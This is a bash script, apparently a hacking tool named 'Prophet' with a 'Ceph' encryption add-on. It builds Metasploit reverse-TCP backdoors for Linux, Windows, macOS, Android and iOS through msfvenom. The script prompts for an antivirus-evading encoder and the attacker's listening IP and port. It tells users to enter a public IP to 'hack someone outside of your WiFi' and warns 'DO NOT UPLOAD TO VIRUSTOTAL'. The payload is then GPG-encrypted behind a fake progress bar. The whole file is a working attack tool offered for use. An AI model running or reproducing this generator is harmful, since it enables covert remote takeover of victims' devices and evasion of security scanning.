#! /bin/bash

 bold=`echo -en "\e[1m"`
 underline=`echo -en "\e[4m"`
 dim=`echo -en "\e[2m"`
 strickthrough=`echo -en "\e[9m"`
 blink=`echo -en "\e[5m"`
 reverse=`echo -en "\e[7m"`
 hidden=`echo -en "\e[8m"`
 normal=`echo -en "\e[0m"`
 black=`echo -en "\e[30m"`
 red=`echo -en "\e[31m"`
 green=`echo -en "\e[32m"`
 orange=`echo -en "\e[33m"`
 blue=`echo -en "\e[34m"`
 purple=`echo -en "\e[35m"`
 aqua=`echo -en "\e[36m"`
 gray=`echo -en "\e[37m"`
 darkgray=`echo -en "\e[90m"`
 lightred=`echo -en "\e[91m"`
 lightgreen=`echo -en "\e[92m"`
 lightyellow=`echo -en "\e[93m"`
 lightblue=`echo -en "\e[94m"`
 lightpurple=`echo -en "\e[95m"`
 lightaqua=`echo -en "\e[96m"`
 white=`echo -en "\e[97m"`
 default=`echo -en "\e[39m"`
 BLACK=`echo -en "\e[40m"`
 RED=`echo -en "\e[41m"`
 GREEN=`echo -en "\e[42m"`
 ORANGE=`echo -en "\e[43m"`
 BLUE=`echo -en "\e[44m"`
 PURPLE=`echo -en "\e[45m"`
 AQUA=`echo -en "\e[46m"`
 GRAY=`echo -en "\e[47m"`
 DARKGRAY=`echo -en "\e[100m"`
 LIGHTRED=`echo -en "\e[101m"`
 LIGHTGREEN=`echo -en "\e[102m"`
 LIGHTYELLOW=`echo -en "\e[103m"`
 LIGHTBLUE=`echo -en "\e[104m"`
 LIGHTPURPLE=`echo -en "\e[105m"`
 LIGHTAQUA=`echo -en "\e[106m"`
 WHITE=`echo -en "\e[107m"`
 DEFAULT=`echo -en "\e[49m"`

clear

CephUse="Unknown"

echo $lightpurple$bold
echo -e "                /     ___  ____  ____  _  _      |"
echo -e "          /          / __)(  __)(  _ \/ )( \         |"
echo -e "    <               ( (__  ) _)  ) __/) __ (               >"
echo -e "        \            \___)(____)(__)  \_)(_/V:1.0.0    /$lightred$bold"
echo -e "|\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|"
echo -e " d$purple                     CEPH FILE ENCRYPTION$lightred                       b "
echo -e "d                                                                  b"
echo -e "<[$lightgreen Ceph$lightred ]>"
echo -e "Do you want me to encrypt your future backdoor in RSA Strong Encrytion Key?"
echo -e "                            <<: Yes / No :>>"
read -p "$lightred$HOSTNAME$lightgreen:$lightred$USERNAME$lightyellow \/$lightpurple Ceph$lightyellow :> " cephencrypt
case $cephencrypt in
           Yes) 
           CephUse="Yes" ;;
           No) 
           CephUse="No" ;;
esac
clear
echo $lightred
echo -e ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e ":                                                          ___                 _          _                                                 : "  
echo -e ":                                                         / _ \_ __ ___  _ __ | |__   ___| |_                                               :" 
echo -e ":                                                        / /_)/  __/ _ \|  _ \|  _ \ / _ \ __|                                              :"
echo -e ":                                                       / ___/| | | (_) | |_) | | | |  __/ |_                                               :"
echo -e ":                                                       \/    |_|  \___/| .__/|_| |_|\___|\__|                                              :"
echo -e ":                                                                       |_|                                                                 :"
echo -e ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::| { DO NOT UPLOAD TO VIRUSTOTAL } |:::::::::::::::::::::::::::::::::::::::::::::::::"$lightgreen
echo -e "<:What system should the backdoor be based:>"$lightyellow
echo -e "[1]: Linux"
echo -e "[2]: Windows"
echo -e "[3]: MacOS / OS X"
echo -e "[4]: Android"
echo -e "[5]: Iphone / iOS"
read -p "$lightgreen$HOSTNAME$lightred /$lightgreen $USERNAME$lightyellow :::>$normal$bold " platform
case $platform in
       1) platform="linux"
       backdoor="linux/x86/meterpreter/reverse_tcp" 
       format="elf" ;;
       2) platform="windows"
       backdoor="windows/meterpreter/reverse_tcp" 
       format="exe" ;;
       3) platform="osx"
       backdoor="osx/x64/meterpreter/reverse_tcp" 
       format="elf" ;;
       4) platform="android"
       backdoor="android/meterpreter/reverse_tcp" 
       format="apk" ;;
       5) platform="apple_ios"
       backdoor="osx/armle/shell_reverse_tcp" 
       format="macho";;
esac
clear
echo $lightred
echo -e ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e ":                                                          ___                 _          _                                                 : "  
echo -e ":                                                         / _ \_ __ ___  _ __ | |__   ___| |_                                               :" 
echo -e ":                                                        / /_)/  __/ _ \|  _ \|  _ \ / _ \ __|                                              :"
echo -e ":                                                       / ___/| | | (_) | |_) | | | |  __/ |_                                               :"
echo -e ":                                                       \/    |_|  \___/| .__/|_| |_|\___|\__|                                              :"
echo -e ":                                                                       |_|                                                                 :"
echo -e ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::| { DO NOT UPLOAD TO VIRUSTOTAL } |:::::::::::::::::::::::::::::::::::::::::::::::::"$lightgreen
echo -e "{ IMPORTANT }"
echo -e "If you have choosen yes to Ceph above, your backdoor will be encrypted 2 times."$lightgreen
echo -e "<:What encoder/encryption should we use:>"$lightyellow
echo -e "[1]: x86/shikata_ga_nai > Exellent "
echo -e "[2]: cmd/powershell_base64 > Exellent"
echo -e "[3]: php/base64 > Great"
echo -e "[4]: cmd/echo > Good"
echo -e "[5]: Custom Encoder/Encryption"
read -p "$lightgreen$HOSTNAME$lightred /$lightgreen $USERNAME$lightyellow :::>$normal$bold " encoder

case $encoder in 
       1) encoder="x86/shikata_ga_nai" ;;
       2) encoder="cmd/powershell_base64" ;;
       3) encoder="php/base64" ;;
       4) encoder="cmd/echo" ;;
       5) echo -e "Make sure your encoder exists the metasploit database."
       read -p $lightyellow"Custom Encoder :> " customencoder
       encoder=$customencoder ;;
esac
clear
echo $lightred
echo $lightred
echo -e ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e ":                                                          ___                 _          _                                                 : "  
echo -e ":                                                         / _ \_ __ ___  _ __ | |__   ___| |_                                               :" 
echo -e ":                                                        / /_)/  __/ _ \|  _ \|  _ \ / _ \ __|                                              :"
echo -e ":                                                       / ___/| | | (_) | |_) | | | |  __/ |_                                               :"
echo -e ":                                                       \/    |_|  \___/| .__/|_| |_|\___|\__|                                              :"
echo -e ":                                                                       |_|                                                                 :"
echo -e ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::| { DO NOT UPLOAD TO VIRUSTOTAL } |:::::::::::::::::::::::::::::::::::::::::::::::::"$lightgreen
echo -e "<:Provide Your local/public IP and Port to connect to:>"
echo -e "<:Use your public IP to hack someone outside of your WiFi, use your local ip to hack someone on your WiFi:>"$lightyellow
read -p "$lightgreen$HOSTNAME$lightred /$lightgreen $USERNAME$lightyellow IP :::>$normal$bold " ip 
read -p "$lightgreen$HOSTNAME$lightred /$lightgreen $USERNAME$lightyellow Port :::>$norml$bold " port
clear
echo $lightred
echo -e ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e ":                                                          ___                 _          _                                                 : "  
echo -e ":                                                         / _ \_ __ ___  _ __ | |__   ___| |_                                               :" 
echo -e ":                                                        / /_)/  __/ _ \|  _ \|  _ \ / _ \ __|                                              :"
echo -e ":                                                       / ___/| | | (_) | |_) | | | |  __/ |_                                               :"
echo -e ":                                                       \/    |_|  \___/| .__/|_| |_|\___|\__|                                              :"
echo -e ":                                                                       |_|                                                                 :"
echo -e ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::| { DO NOT UPLOAD TO VIRUSTOTAL } |:::::::::::::::::::::::::::::::::::::::::::::::::"$lightgreen
echo -e "<:How should we name the backdoor:>"
echo -e "<:Don't worry about the format its already included in the name:>"$lightyellow
read -p "$lightgreen$HOSTNAME$lightred /$lightgreen $USERNAME$lightyellow :::>$normal$bold " name
clear
echo $lightred
echo -e ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::"
echo -e ":                                                          ___                 _          _                                                 : "  
echo -e ":                                                         / _ \_ __ ___  _ __ | |__   ___| |_                                               :" 
echo -e ":                                                        / /_)/  __/ _ \|  _ \|  _ \ / _ \ __|                                              :"
echo -e ":                                                       / ___/| | | (_) | |_) | | | |  __/ |_                                               :"
echo -e ":                                                       \/    |_|  \___/| .__/|_| |_|\___|\__|                                              :"
echo -e ":                                                                       |_|                                                                 :"
echo -e ":::::::::::::::::::::::::::::::::::::::::::::::::::::::::| { DO NOT UPLOAD TO VIRUSTOTAL } |:::::::::::::::::::::::::::::::::::::::::::::::::"$lightgreen
echo -e "Creating backdoor ..."
echo -e $lightaqua"Encoder : $lightred$encoder"
echo -e $lightaqua"Backdoor Type : $lightred$backdoor"
echo -e $lightaqua"Format / Platform : $lightred$format$lightaqua / $lightred$platform"
echo -e $lightaqua"Name : $lighred$name"
msfvenom --platform $platform -p $backdoor LHOST=$ip LPORT=$port -b "\x00\ffx" -e $encoder -f $format > /root/Desktop/$name.$format
clear

if [ $CephUse == No ]
then
  echo -e "Finish!"
  read -p "Press any keys to continue ..."
  procep
fi

if [ $CephUse == Yes ]
then
  echo $lightpurple$bold
  echo -e "                /     ___  ____  ____  _  _      |"
  echo -e "          /          / __)(  __)(  _ \/ )( \         |"
  echo -e "    <               ( (__  ) _)  ) __/) __ (               >"
  echo -e "        \            \___)(____)(__)  \_)(_/V:1.0.0    /$lightred$bold"
  echo -e "|\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|"
  echo -e " d$purple                     CEPH FILE ENCRYPTION$lightred                       b "
  echo -e "d                                                                  b"
  echo $lightgreen
  echo -e "[i]Detecting encryption..."
  sleep 2
  clear
  echo -e "[i]::: %15 :::"
  sleep 2
  clear
  echo -e "[i]::: %34 :::"
  sleep 2
  clear
  echo -e "[i]::: %56 :::"
  sleep 2
  clear
  echo -e "[i]::: %71 :::"
  sleep 2
  clear
  echo -e "[i]::: %83 :::"
  sleep 2
  clear
  echo -e "[i]::: %94 :::"
  sleep 2
  clear
  echo -e "[i]::: %100 :::"
  sleep 2
  clear
  echo -e "[i]::: Finished :::"
  echo -e "[i] Encoder = $encoder"
  clear
  echo $lightpurple
  echo -e "                /     ___  ____  ____  _  _      |"
  echo -e "          /          / __)(  __)(  _ \/ )( \         |"
  echo -e "    <               ( (__  ) _)  ) __/) __ (               >"
  echo -e "        \            \___)(____)(__)  \_)(_/V:1.0.0    /$lightred$bold"
  echo -e "|\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/|"
  echo -e " d$purple                     CEPH FILE ENCRYPTION$lightred                       b "
  echo -e "d                                                                  b"
  echo -e $lightaqua"Encoder : $lightred$encoder"
  echo -e $lightaqua"Backdoor Type : $lightred$backdoor"
  echo -e $lightaqua"Format / Platform : $lightred$format$lightaqua / $lightred$platform"
  echo -e $lightaqua"Name : $lighred$name"
  cd /root/Desktop/ 
  echo -e $purple"[i]Launching Encryption ..."
  sleep 2
  echo -e $purple"Encryting $lightred$name$purple in RSA, Please stand by while Ceph is encrypting your backdoor."
  clientkey="64A14131FEB5ECFC7929C8EA3A589C6B5FBA39D2"
  sleep 3
  gpg2 --encrypt --recipient $clientkey -- $name.$format
  rm $name.$format
  mv $name.$format.gpg $name.$format
  echo -e $lightgreen"[✔]Finish encrypting!"
  sleep 1
  read -p $lightyellow"Press any keys to continue ..."$normal
  procep
fi































